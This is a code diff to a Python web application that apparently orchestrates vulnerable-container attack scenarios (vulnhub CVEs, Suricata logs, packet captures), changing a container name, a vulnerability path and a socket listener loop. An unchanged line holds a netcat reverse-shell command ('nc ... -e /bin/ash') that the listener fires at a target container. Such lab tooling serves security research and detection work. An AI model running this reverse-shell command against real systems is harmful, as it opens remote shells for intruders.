@@ -365,7 +365,7 @@ def environmentView(request):
                 listen_cmd = "nc 172.28.0.157 4242 -e /bin/ash"
 
             if current_scenario.listen_process_pid == 0:
-                listen_process = mp.Process(target=listen,args=("0.0.0.0",18200,listen_cmd,target_os, "target" ))
+                listen_process = mp.Process(target=listen,args=("0.0.0.0",18200,listen_cmd,target_os, "required_containers_target_1" ))
 
                 listen_process.start()
 
@@ -633,7 +633,7 @@ def cveView(request):
         vulns_to_remove = request.POST.getlist("remove_vuln")
 
         for vuln in vulns_to_remove:
-            current_scenario.selected_vulns.remove("{}/vulnhub{}".format(resource_file_path,vuln))
+            current_scenario.selected_vulns.remove("vulnhub{}".format(vuln))
 
     if "selected_vuln" in request.POST:
 
@@ -1430,12 +1430,13 @@ def log_clean_up(pcap_file_to_cleanup,container_logs_to_recover, suricata_log_di
 
     print("\Stopping logging - Output files saved in {} - Containers are still running".format(output_fldr))
 
-
+#args=("0.0.0.0",18200,listen_cmd,target_os, "target" )
 def listen(ip,port,cmd,target_os,target_container):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((ip, port))
+    s.listen(1)
+
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((ip, port))
-        s.listen(1)
 
         print("Listening on port {}".format(str(port)))
         conn, addr = s.accept()
@@ -1450,7 +1451,7 @@ def listen(ip,port,cmd,target_os,target_container):
 
         subprocess.run(['gnome-terminal', '--', 'bash', '-c', wrapper_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
 
-        conn.close()
+    conn.close()
 
 def get_uwe_net_interface(ip_addr):
 
